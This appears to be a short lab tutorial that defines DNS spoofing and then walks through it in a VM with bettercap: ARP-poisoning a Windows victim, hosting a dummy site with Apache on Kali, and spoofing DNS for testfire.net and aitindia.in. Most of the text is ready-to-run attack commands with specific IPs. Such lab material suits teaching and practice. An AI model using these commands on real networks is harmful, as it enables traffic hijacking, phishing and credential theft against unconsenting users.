## What is DNS Spoofing?

DNS spoofing (also known as DNS cache poisoning) is a cyberattack where an attacker corrupts the Domain Name System (DNS) resolution process by injecting false information. This causes a DNS server or resolver to return an incorrect IP address for a domain name, redirecting users to a malicious website instead of the legitimate one. The user sees the correct domain in their browser but connects to an attacker-controlled server, enabling phishing, data theft, malware distribution, or man-in-the-middle (MITM) attacks.















We are going to perform DNS spoof attack using **bettercap** tool ------

## Step 1 : First we have to perform Arp-Poisoning atttack with the victim machine (Using bettercap tool)

How to Perform (In VM):

We have two machines **Kali** (Attacker)  and  **Windows** (Victim)  machines.

```
sudo bettercap --iface eth0

net.probe on

arp.spoof on

set arp.spoof.targets 192.168.229.132 (Victim IP)

```

--------------

## Step 2 : Start apache on kali

```
sudo systemctl start apache2 
```

Here we host a dummy website 

------------
## Step 3 : Starting dns spoofing 

```
set dns.spoof.address 192.168.229.131 (Attacker IP)

set dns.spoof.domains testfire.net,aitindia.in

dns.spoof on
```





